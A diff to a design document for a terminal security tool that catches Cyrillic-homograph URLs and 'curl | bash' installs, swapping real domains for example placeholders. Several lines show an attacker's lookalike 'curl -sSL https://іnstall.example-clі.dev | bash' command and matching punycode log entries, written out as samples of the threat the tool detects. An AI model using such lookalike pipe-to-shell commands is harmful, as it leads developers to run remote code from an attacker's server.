@@ -6,9 +6,10 @@
 
 ```
 1. Attacker puts this in a README:
-   curl -L https://foundry.paradіgm.xyz | bash
-                         ^
-                    Cyrillic і (0xd1 0x96), not Latin i
+   curl -sSL https://іnstall.example-clі.dev | bash
+                       ^                  ^
+                  Cyrillic і          Cyrillic і
+                 (U+0456)            (U+0456)
 
 2. Developer copies it, pastes into terminal, hits enter
 
@@ -347,11 +348,11 @@ Text appears on the command line normally. No delay. No output. User sees nothin
   +-- CLIPBOARD WARNING --------------------------------------------+
   | Non-ASCII characters detected in pasted URL hostname.           |
   |                                                                 |
-  | Pasted:  curl -L https://foundry.parad*gm.xyz | bash           |
-  | Actual:  curl -L https://foundry.xn--paradgm-2of.xyz           |
+  | Pasted:  curl -sSL https://іnstall.example-clі.dev | bash      |
+  | Actual:  curl -sSL https://xn--nstall-cuf.example-xn--cl-8cd.dev |
   |                                                                 |
   | Safe rewrite:                                                   |
-  |   tirith run https://foundry.paradigm.xyz                     |
+  |   tirith run https://get.example-tool.sh                      |
   |                                                                 |
   | [p]aste anyway  [c]ancel  [s]how bytes                          |
   +------ this content was NOT placed on your command line ----------+
@@ -461,13 +462,13 @@ When a source-to-sink connection is detected (even with a clean URL), offer to d
 ```
   +-- PIPE-TO-SHELL INTERCEPTED ------------------------------------+
   |                                                                 |
-  |  Source: https://get.foundry.sh (TLS ok, cert age: 2yr)        |
+  |  Source: https://get.example-tool.sh (TLS ok, cert age: 2yr)        |
   |  Size:   4.2 KB (138 lines)                                    |
   |  SHA256: a1b2c3d4e5...                                          |
   |                                                                 |
   |  Static analysis (best-effort, inferred from script content):   |
-  |  |- Downloads binary from: foundry.paradigm.xyz                 |
-  |  |- Writes to: ~/.foundry/bin/ (inferred)                       |
+  |  |- Downloads binary from: cdn.example-tool.sh                  |
+  |  |- Writes to: ~/.example-tool/bin/ (inferred)                  |
   |  |- Modifies: ~/.bashrc (inferred, adds to PATH)               |
   |  |- Network calls: 2 domains referenced                         |
   |  |- Privilege: no sudo                                          |
@@ -479,7 +480,7 @@ When a source-to-sink connection is detected (even with a clean URL), offer to d
   |  [r]un  [v]iew script  [a]bort                                  |
   |                                                                 |
   |  Safe alternative:                                              |
-  |    tirith run https://get.foundry.sh                          |
+  |    tirith run https://get.example-tool.sh                     |
   +---------------------------------------------------------------- +
 ```
 
@@ -498,7 +499,7 @@ Static analysis extracts from the script text:
 One-command replacement for `curl ... | bash` that becomes muscle memory:
 
 ```bash
-$ tirith run https://get.foundry.sh
+$ tirith run https://get.example-tool.sh
 ```
 
 This command:
@@ -511,13 +512,13 @@ This command:
 7. Caches the downloaded script — second run is instant if hash matches
 
 ```
-  Downloading https://get.foundry.sh ...
+  Downloading https://get.example-tool.sh ...
   SHA256: a1b2c3d4e5f6...
   Size:   4.2 KB (138 lines)
 
   Static analysis (inferred from script content):
-  |- Downloads binary from: foundry.paradigm.xyz
-  |- Writes to: ~/.foundry/bin/
+  |- Downloads binary from: cdn.example-tool.sh
+  |- Writes to: ~/.example-tool/bin/
   |- Modifies: ~/.bashrc (adds to PATH)
   |- Network calls: 2 domains referenced
 
@@ -530,13 +531,13 @@ When tirith runs an installer in safe mode (`tirith run`), it stores a receipt:
 
 ```json
 {
-  "url": "https://get.foundry.sh",
-  "final_url": "https://get.foundry.sh",
+  "url": "https://get.example-tool.sh",
+  "final_url": "https://get.example-tool.sh",
   "redirects": 0,
   "sha256": "a1b2c3d4e5f6...",
   "size_bytes": 4301,
-  "domains_referenced": ["foundry.paradigm.xyz"],
-  "paths_referenced": ["~/.foundry/bin/forge", "~/.bashrc"],
+  "domains_referenced": ["cdn.example-tool.sh"],
+  "paths_referenced": ["~/.example-tool/bin/example-tool", "~/.bashrc"],
   "analysis_method": "static",
   "privilege": "user",
   "timestamp": "2026-02-01T14:32:01Z",
@@ -552,20 +553,20 @@ Commands:
 
 ```bash
 $ tirith receipt last
-  Last install: https://get.foundry.sh
+  Last install: https://get.example-tool.sh
   SHA256: a1b2c3d4e5f6...
-  Domains referenced: foundry.paradigm.xyz
-  Paths referenced: ~/.foundry/bin/forge, ~/.bashrc
+  Domains referenced: cdn.example-tool.sh
+  Paths referenced: ~/.example-tool/bin/example-tool, ~/.bashrc
   Analysis: static (inferred from script content)
   Run at: 2026-02-01 14:32 UTC in /Users/dev/project (main)
 
 $ tirith receipt list
-  2026-02-01  https://get.foundry.sh          a1b2c3...  static
+  2026-02-01  https://get.example-tool.sh          a1b2c3...  static
   2026-01-28  https://sh.rustup.rs            f7e8d9...  static
   2026-01-15  https://get.docker.com           b3c4d5...  static
 
 $ tirith receipt verify a1b2c3d4e5f6
-  Fetching https://get.foundry.sh ...
+  Fetching https://get.example-tool.sh ...
   Current SHA256: a1b2c3d4e5f6...
   Receipt SHA256: a1b2c3d4e5f6...
   MATCH — script has not changed since last run.
@@ -593,16 +594,16 @@ $ tirith why
   What happened:
     Your command contained a URL with Cyrillic character і (U+0456)
     at position 27 in the hostname. This is a homograph attack —
-    the URL visually mimics foundry.paradigm.xyz but resolves to
+    the URL visually mimics install.example-cli.dev but resolves to
     a completely different server.
 
   Proof:
-    Byte 27: expected 0x69 (Latin i), got 0xd1 0x96 (Cyrillic і)
+    Byte 12: expected 0x69 (Latin i), got 0xd1 0x96 (Cyrillic і)
 
   Safe rewrite:
-    curl -L https://foundry.paradigm.xyz | bash
+    curl -sSL https://install.example-cli.dev | bash
     or better:
-    tirith run https://foundry.paradigm.xyz
+    tirith run https://install.example-cli.dev
 ```
 
 Every warning comes with:
@@ -614,7 +615,7 @@ Developers forgive warnings when they come with a clean fix.
 ### 9. `tirith score` — URL trust score
 
 ```bash
-$ tirith score https://foundry.paradigm.xyz
+$ tirith score https://get.example-tool.sh
 
   URL trust:     98/100
     [ok] All ASCII hostname
@@ -643,24 +644,25 @@ A clean domain can still produce a "HIGH command risk" if piped to shell. These 
 ### 10. `tirith diff` — terminal diff view
 
 ```bash
-$ tirith diff https://foundry.paradіgm.xyz
+$ tirith diff https://іnstall.example-clі.dev
 
-  Expected:  f o u n d r y . p a r a d i g m . x y z
-  Got:       f o u n d r y . p a r a d і g m . x y z
-                                        ^
-                                   U+0456 CYRILLIC
-                                   SMALL LETTER
-                                   BYELORUSSIAN-
-                                   UKRAINIAN I
+  Expected:  i n s t a l l . e x a m p l e - c l i . d e v
+  Got:       і n s t a l l . e x a m p l e - c l і . d e v
+             ^                                   ^
+        U+0456 CYRILLIC                    U+0456 CYRILLIC
+        SMALL LETTER                       SMALL LETTER
+        BYELORUSSIAN-                      BYELORUSSIAN-
+        UKRAINIAN I                        UKRAINIAN I
 
   Byte comparison:
-  Position 13: expected 0x69 (Latin i) | got 0xd1 0x96 (Cyrillic і, 2 bytes)
+  Position 0: expected 0x69 (Latin i) | got 0xd1 0x96 (Cyrillic і, 2 bytes)
+  Position 18: expected 0x69 (Latin i) | got 0xd1 0x96 (Cyrillic і, 2 bytes)
 
   Closest ASCII mapping:
-  paradіgm -> paradigm
-  ^^^^^^^     ^^^^^^^
-       |           |
-       Cyrillic    Latin
+  іnstall.example-clі -> install.example-cli
+  ^                  ^    ^                  ^
+  Cyrillic           |    Latin              Latin
+                Cyrillic
 ```
 
 Default display for any homograph/confusable warning. Shows:
@@ -673,7 +675,7 @@ Default display for any homograph/confusable warning. Shows:
 
 ```
 # ~/.tirith/allowlist — one domain per line, supports wildcards
-get.foundry.sh
+get.example-tool.sh
 sh.rustup.rs
 raw.githubusercontent.com
 *.docker.com
@@ -699,7 +701,7 @@ Every blocked, warned, and allowed URL is logged:
 
 ```
 # ~/.tirith/log (structured, one JSON object per line)
-{"ts":"2026-02-01T14:32:01Z","action":"block","reason":"non_ascii_hostname","cmd":"curl -L https://foundry.xn--paradgm-2of.xyz | bash","cwd":"/Users/dev/project","git":"main","url":"https://foundry.xn--paradgm-2of.xyz"}
+{"ts":"2026-02-01T14:32:01Z","action":"block","reason":"non_ascii_hostname","cmd":"curl -sSL https://xn--nstall-cuf.example-xn--cl-8cd.dev | bash","cwd":"/Users/dev/project","git":"main","url":"https://xn--nstall-cuf.example-xn--cl-8cd.dev"}
 {"ts":"2026-02-01T14:35:12Z","action":"warn","reason":"source_sink_pipe","cmd":"curl -fsSL https://get.docker.com | sh","cwd":"/Users/dev/infra","git":"deploy","url":"https://get.docker.com"}
 {"ts":"2026-02-01T14:35:15Z","action":"allow","reason":"user_override","cmd":"curl -fsSL https://get.docker.com | sh","cwd":"/Users/dev/infra","git":"deploy","url":"https://get.docker.com"}
 ```
@@ -820,7 +822,7 @@ No naked warnings. Every trigger includes:
 
 ```
   WARN: Pipe-to-shell detected.
-  Safe alternative: tirith run https://get.foundry.sh
+  Safe alternative: tirith run https://get.example-tool.sh
 ```
 
 ### Consistent prompt UI
@@ -953,8 +955,8 @@ When a lookalike domain is found, the alert includes:
   NEW LOOKALIKE DETECTED
   ============================================================
 
-  Your domain:    paradigm.xyz
-  Lookalike:      paradіgm.xyz (Cyrillic і)
+  Your domain:    example-cli.dev
+  Lookalike:      example-clі.dev (Cyrillic і)
   Registered:     2026-01-30 (2 days ago)
   Registrar:      Namecheap
   Hosting:        185.234.xx.xx (Hetzner, DE)
@@ -1059,7 +1061,7 @@ rules:
     - gcr.io
 
   allowed_install_domains:            # only these for curl|bash (if pipe_to_shell is warn, not block)
-    - get.foundry.sh
+    - get.example-tool.sh
     - sh.rustup.rs
     - raw.githubusercontent.com
 
